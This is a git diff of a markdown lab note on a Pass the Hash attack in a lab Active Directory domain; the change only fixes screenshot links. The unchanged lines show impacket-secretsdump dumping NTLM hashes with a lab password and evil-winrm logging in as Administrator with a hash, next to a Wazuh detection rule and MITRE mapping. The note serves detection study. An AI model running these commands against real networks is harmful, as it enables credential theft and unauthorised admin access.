@@ -5,9 +5,9 @@ Pass the Hash requires no additional lab configuration. The User's NTLM hash obt
 
 **Attack**
 Get The NTLM Hash`impacket-secretsdump redteam.local/dcreplicate:"Password123"@$IP`
-![[Dump Hash.png]]
+![Description](Screenshots/Dump%20Hash.png)
 
-Authenticating Via NTLM Hash: `evil-winrm -i $IP -u "Administrator" -H "$HASH$"`![description[WinRM auth.png]]
+Authenticating Via NTLM Hash: `evil-winrm -i $IP -u "Administrator" -H "$HASH$"`![Description](Screenshots/WinRM%20auth.png)
 
 **Detection**
 
@@ -37,7 +37,7 @@ Custom Wazuh Rule
 | `T1550.002`                               | MITRE ATT&CK ID         | Pass the Hash                   |
 
 NTLM Authentication to a user with Admin level privileges.
-![[Active Directory/Pass The Hash/screenshots/Wazuh.png]]
+![Description](Screenshots/Wazuh.png)
 
 **Mitigations**
 
